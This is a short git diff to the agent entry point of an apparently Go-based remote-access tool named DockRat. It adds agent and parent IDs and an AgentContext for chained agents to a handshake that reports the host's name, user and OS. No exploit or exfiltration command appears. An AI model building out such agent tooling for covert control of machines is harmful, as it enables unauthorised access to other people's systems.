@@ -1,4 +1,4 @@
-
+//file: new/cmd/agent/main.go
 
 package main
 
@@ -9,15 +9,16 @@ import (
 	"os"
 	"runtime"
 
-	"github.com/Singert/DockRat/core/protocol"
 	"github.com/Singert/DockRat/core/network"
+	"github.com/Singert/DockRat/core/protocol"
 )
 
 type HandshakePayload struct {
 	Hostname string `json:"hostname"`
 	Username string `json:"username"`
 	OS       string `json:"os"`
-	ParentID int   `json:"parent_id"` 
+	SelfID   int    `json:"self_id"`   // 当前 agent 的 ID
+	ParentID int    `json:"parent_id"` // 初始为 -1，表示没有父节点
 }
 
 func main() {
@@ -59,9 +60,12 @@ func main() {
 
 	log.Println("[+] Handshake message sent")
 
-	network.StartAgent(conn)
+	network.StartAgent(&network.AgentContext{
+		SelfID:     1,
+		Conn:       conn,
+		ParentConn: nil, // 顶级 agent，无上层
+	})
 }
-
 
 /*是否继续实现：
 
